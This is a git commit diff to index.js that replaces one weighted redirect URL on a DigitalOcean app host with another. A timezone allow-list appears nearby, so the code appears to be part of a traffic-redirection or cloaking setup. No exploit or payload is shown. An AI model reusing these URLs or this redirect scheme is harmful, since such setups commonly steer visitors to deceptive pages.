007870f3115a12d0b9e661c1a77354e53e60952e
paalakash <palaksh452@gmail.com>
2026-07-09 06:51:32 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://shark-app-7oqpd.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://stingray-app-tt9n5.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
     
 ];
 
